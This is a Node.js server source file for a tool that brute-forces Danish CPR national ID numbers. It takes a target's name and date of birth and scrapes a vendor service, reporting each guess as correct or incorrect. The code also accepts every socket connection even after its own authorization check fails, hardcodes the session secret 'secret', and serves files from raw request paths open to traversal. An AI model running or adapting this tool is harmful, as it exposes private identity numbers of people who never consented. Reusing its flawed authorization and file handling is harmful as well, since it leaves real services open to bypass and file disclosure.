var kutils = require("./utils/konUtils.js"),
	Curl = require("./utils/Curl.js"),	  
	vendorSpecific = require("./vendors/Callme.js"),
	vendorBase = require("./vendorBase.js"),
		
	// npm modules
	express = require('express'),
	app = express.createServer(),	
  io = require('socket.io'),		
	$ = require("jquery"),	  
	querystring = require("querystring"),
	Step = require("step"),		
	
	// Session handling
  MemoryStore = express.session.MemoryStore,    
  sessionStore = new MemoryStore(),
  Session = require('connect').middleware.session.Session,
	parseCookie = require('connect').utils.parseCookie;     
	
// prepare session (cookie) handling
app.configure(function () {
	app.use(express.cookieParser());
	app.use(express.session({store: sessionStore, secret: 'secret', key: 'express.sid'}));
});	
	
// start webserver and sockets
app.listen(3000);
var sio = io.listen(app);
sio.set('log level', 1); 


/*
 * Web server routing
 ******************************************/

// pass arguments
app.use(express.bodyParser());

// pass html requests
app.get('/*.html', function(req, res){
  res.sendfile(__dirname + '/pages/'+ req.url);
});

// pass html requests
app.get('/js/*', function(req, res){
  res.sendfile(__dirname + req.url);
});

// pass html requests
app.get('/css/*', function(req, res){
  res.sendfile(__dirname + req.url);
});

// pass html requests
app.get('/images/*', function(req, res){
  res.sendfile(__dirname + req.url);
});

// receive request from frontend
app.get('/', function(req, res){
  res.sendfile(__dirname + '/pages/index.html');
});


/*
 * Sockets
 ******************************************/

// authentication
//sio.sockets.on('connection', function (socket) {
sio.configure(function (){

	// auth - happens on every client reload
	sio.set('authorization', function (data, callback) {
		kutils.debug("Authorizing", "", 1, "socket");
		
	  if (data.headers.cookie) {
	  
	  	// parse headers -> parse cookie -> get sessionID to retrieve the entire session later
			data.cookie = parseCookie(data.headers.cookie);
			data.sessionID = data.cookie['express.sid'];			    
      data.sessionStore = sessionStore;

			kutils.debug("Connect", 'A socket with sessionID ' + data.sessionID + ' connected!', 1, "socket");

			// get entire session
			sessionStore.get(data.sessionID, function (err, session) {
			
				// session error: refuse connection			
				if (err || !session) {
					callback('Error', false);
					
				// save the session data and accept the connection					
				} else {
					data.session = new Session(data, session);
					callback(null, true);
				}
			});			
		} else {
			// no cookie: refuse connection
			return callback('No cookie transmitted.', false);
		}
		// accept the incoming connection
		callback(null, true);
	});
	
});

// get socket connection
sio.sockets.on('connection', function (socket) {

	// receive basic data from client. only happens on first request
	socket.on('setBasicData', function (basicData) {
		var hs = socket.handshake;
		
		// hacky: abort if session is undefined
		if(hs == undefined || hs.session == undefined){
		  socket.emit('error', 'reload');
			kutils.error("Socket error #1: hs is undefined!", hs);
			return;
		}
	
		if((hs.session.vendor != undefined && typeof hs.session.vendor.updatePlaceholders !== 'function') || hs.session.vendor == undefined){
			hs.session.vendor = {};
			
			// merge base with new session object
			$.extend(hs.session.vendor, vendorBase);
			
			// merge specific vendor and new session object
			$.extend(hs.session.vendor.options, vendorSpecific.options);
			$.extend(hs.session.vendor.data, vendorSpecific.data);
			$.extend(hs.session.vendor.settings, vendorSpecific.settings);
			hs.session.vendor.getResponse = vendorSpecific.getResponse;	  
				
			// set first- and last name according to filters
			hs.session.vendor.updatePlaceholders({
				firstName: basicData.firstName,
				lastName: basicData.lastName
			}, "name");
			
			// set dob
			hs.session.vendor.dob = basicData.dob;
						
			// add to session and save
			hs.session.save();
			kutils.debug("Session saved!", "", 0, "socket");
		}
				
		// get vendor session cookie (not handshake session!!)
		if(typeof vendorSpecific.prepareRequest === 'function') {	  
			vendorSpecific.prepareRequest(function(cookie){	  
				hs.session.vendor.options.cookie = cookie;
			});
		}
	});
	
	// set cpr number - happens on every request from client
	socket.on('setCprNumber', function (cprNumber) {

		var hs = socket.handshake;
		
		// hacky: abort if session cannot be retrieved
		if(hs == undefined || hs.session == undefined){
		  socket.emit('error', 'reload');
			kutils.error("Socket error #2: hs is undefined!", hs);			
			return;
		}
		
		var vendorObj = {};
		Step(
		
			// clone session vendor object
			function step1(){
				return $.extend(true, vendorObj, hs.session.vendor);
			
			// set original cpr number (not formatted)			
		},function step2(){
				var originalCprNumber = vendorObj.dob + "" + cprNumber;				
				return vendorObj.settings.originalCprNumber = originalCprNumber;	
			
		// call init function with vendor object
		}, function step3(){
				init(socket, vendorObj);
		})	
	});			
});




/*
 * Start brute forcing
 ******************************************/

function init(socket, vendorObj){
				
		// update placeholders for cpr number
		vendorObj.updatePlaceholders(vendorObj.settings.originalCprNumber, "cpr");

		console.log("Init for " + vendorObj.settings.originalCprNumber);
	// queueing requests
  socket.emit('queueing');

	Step(
		// send request
		function step1(){
			console.log("Timeout 1");
			var req = {
				options: vendorObj.options,
				data: vendorObj.data,
				settings: vendorObj.settings
			};
			Curl.scrape(req, this);	
		},
		
		// get response from vendor and parse to vendorparser
		function step2(req, res){	
			console.log("Timeout 2");
								
			// connection error
			if(res.error !== undefined ){
				socket.emit('failed', req.settings.realCprNumber);						
				kutils.debug("Adding to retry", req.settings.realCprNumber, 1, "step2")
				console.log(res.error);
			// no connection errors
			}else{
				vendorObj.getResponse(req, res, this);
			}
		},
		
		// check response
		function step3(cpr, status){
			console.log("Timeout 3" + cpr);
		
			if(status == "success"){
				socket.emit('correctCPR', cpr);
				kutils.debug("Correct CPR", cpr, 2, "getResponse");
			}else{					
				socket.emit('incorrectCPR', cpr, status);
				kutils.debug("Incorrect CPR", cpr + ' - ' + JSON.stringify(status), 2, "getResponse");
			}

			socket.emit('completed');

			// clean up: remove object
			vendorObj = null;
		}
		
	); // end step
}
